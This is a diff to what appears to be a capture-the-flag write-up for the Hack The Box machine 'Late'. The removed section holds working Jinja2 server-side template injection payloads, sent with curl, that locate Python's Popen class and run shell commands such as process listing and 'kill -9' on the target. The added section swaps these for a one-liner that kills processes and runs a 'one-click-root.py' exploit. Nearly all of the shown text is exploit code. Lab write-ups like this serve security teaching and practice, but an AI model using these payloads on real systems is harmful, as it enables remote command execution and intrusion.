@@ -104,15 +104,10 @@ curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(
 ```
 
 
-# somehow it always is damaged if the first try is not working so this is how you fix it:
+# ORC POC
 
 ```bash
-index=$(curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__() }} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html  | tr -d '\n' | sed "s|'>, <|\n|g" | sed "s|'>,<class '|\nclass |g" | grep -in popen | head -n1 | cut -d : -f 1)
-
-# list processes with echo in it
-curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))']("ps aux | grep echo",shell=True,stdout=-1).communicate()[0].strip()}} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html
-
-# kill the process associated with the process
-curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))']("kill -9 2706",shell=True,stdout=-1).communicate()[0].strip()}} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html
-
+kill -9 $(ps aux | grep -i mitm | awk '{print $2}'); pkill nc; ./one-click-root.py
 ```
+
+![](late.htb/ocr.gif)
